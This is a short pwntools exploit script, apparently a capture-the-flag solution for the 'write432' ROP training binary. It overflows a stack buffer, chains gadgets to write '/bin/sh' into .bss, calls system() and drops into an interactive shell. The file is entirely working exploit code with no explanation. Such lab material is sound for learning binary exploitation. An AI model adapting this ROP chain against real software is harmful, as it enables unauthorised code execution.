from pwn import *

_system = p32(0x08048430)
_pop_pop_gadget = p32(0x080486da) # pop edi ; pop ebp ; ret
_mov_gadget = p32(0x08048670)     # mov dword ptr [edi], ebp ; ret
_arg1 = p32(0x6e69622f)           # /bin
_arg2 = p32(0x68732f)             # /sh
_bss = p32(0x0804a048)
_bss_2 = p32(0x0804a04c)

write432 = process('write432')
write432.recv()

payload = b"A" * 40 + b"EBP4"
payload += _pop_pop_gadget
payload += _bss
payload += _arg1
payload += _mov_gadget
payload += _pop_pop_gadget
payload += _bss_2
payload += _arg2
payload += _mov_gadget
payload += _system
payload += b"fake"
payload += _bss

write432.sendline(payload)
write432.interactive()
